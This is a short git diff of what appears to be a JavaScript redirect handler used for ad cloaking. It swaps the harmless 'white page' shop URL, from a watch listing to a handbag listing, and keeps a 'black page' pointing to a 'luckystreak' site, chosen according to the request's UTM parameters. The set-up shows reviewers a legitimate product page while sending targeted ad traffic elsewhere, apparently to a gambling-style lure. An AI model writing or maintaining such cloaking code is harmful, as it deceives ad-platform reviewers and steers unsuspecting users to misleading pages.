@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://gharyal.com/products/omega-constellation-quartz-28mm-13120286055002";
+    const whitePageURL = "https://astore.pk/products/fly-bag-beige?variant=45282275033261";
     const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
